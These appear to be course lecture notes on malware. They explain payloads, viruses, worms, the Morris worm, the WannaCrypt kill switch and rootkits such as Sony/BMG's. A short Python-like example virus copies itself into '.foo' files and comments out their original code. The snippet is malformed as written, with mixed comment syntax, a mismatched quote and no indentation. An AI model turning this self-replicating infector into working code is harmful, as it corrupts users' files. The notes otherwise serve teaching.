## Week 12 - Day 2
### Malware
We’ve seen how to exploit a system. Malware is the next steps for what is done with exploits

#### Payload
The thing the attacker wants to do once an exploit is into place  
Copying data back to a control server  
Deleting files - vandalism  
Encrypting files - ransomware  
Setting up a “backdoor” connection that listens for future commands

#### Virus
Catch all name for unwanted malicious software, but has a more precise definition (related to the biological definition)  
A virus attaches itself to a host (by host we usually mean file, not a network host). 
It “infects” the host, and reproduces  
Hosts are often executable files (programs), or documents that contain code (a word document containing macros, or a PDF that contains javascript, etc)  
One of the less scary issues. It isn’t “alive” as its own program. The host has to execute it.

Viruses try to **propagate** as much as possible  
We want to infect as many hosts as possible, while staying undetected - if it is easy to see it is easy to remove  
Common strategy: attach infected document to an email, spam all contacts  
Typically infected hosts are marked somehow so they don’t get reinfected.  Reinfection = more chance for detection. 
Viruses might go “dormant” to slow their spread to avoid detection

##### Example Virus Code

```
IN = open(sys.argv[0], 'r')
virus = [line for (i,line) in enumerate(IN) if i < 37]
for item in glob.glob("*.foo"): // look for any file type .foo in this case.
IN = open(item, 'r’) 
all_of_it = IN.readlines() 
IN.close()
if any(line.find('foovirus') for line in all_of_it): next // check to see if file has been infected
os.chmod(item, 0777)
OUT = open(item, 'w')
OUT.writelines(virus)
all_of_it = ['#' + line for line in all_of_it] // comment out all other code except for the virus
OUT.writelines(all_of_it)
OUT.close()
```
#### Worms
Much scarier than a virus  
Worms are self-sufficient, and don’t require a host file to attach to  
They can run on their own. They are “alive” unlike a virus  
Like viruses, they propagate to as many machines as they can  

##### First Worm - The Morris Worm
Robert Morris wanted to measure how many hosts were on the internet  
He got a felony conviction for it - Computer Fraud and Abuse Act. Literally went to jail for it  
Then he got tenure at MIT. 
He used 2 exploits to propagate the worm:  
1) a code-injection bug in sendmail, an email server  
2) a buffer overflow in fingerd (the finger daemon)

This ran some shell commands on email servers. Sendmail is at elevated access level - ran at root.  
He also guessed usernames/passwords and attempted to log in to other machines

The fatal flaw for this was **over saturation**  
It replicated too much  
How should a worm/virus know when to stop propagating?  
It should be hard to tell if a worm is already running (or else the “good guys” can easily detect it) - this also means it is hard for the attacker to know if the system is already infected.  
Morris decided that even if it seemed like the worm was running, it should still start a new copy with probability 1/7  
This caused many copies of the worm to be running on the same machines, overloading them, and causing the worm to be detected  
It was exponential growth. It eventually caused machines to crash from being overloaded.  
A similar flaw brought down the WannaCrypt. It tried to download a file from a URL, and if it SUCCEEDED, it stopped. A researcher detected this, registered the domain, and the worm stopped!

#### Rootkits
A rootkit is a particularly nasty malware payload  
They often modify important system files, or the OS itself making them difficult to detect and remove  
You can think of them as a malicious memory management unit. They can sit between user programs and what lies below (OS, hardware). They can lie to user applications!  
Examples include:  
Overwriting the “boot sector” of your hard drive. Every time your machine boots, it runs the malicious code Overwriting system utilities (like /bin/sh, etc)  
Installing nasty device drivers. 
Rootkits can do things like hide malicious processes and files from users (by manipulating ps or ls commands, or the system calls used by them)

##### Sony/BMG Rootkit
Sony/BMG didn’t want users to copy music off their CDs  
They installed a rookit that limited users access to the CD (something like preventing windows explorer from showing the CD contents, for example)  
It hid any files starting with $sys$ from the file browser too Attackers discovered this, and wreaked havoc on vulnerable users  
The Sony removal tool caused other vulnerabilities! They ended up facing a class action lawsuit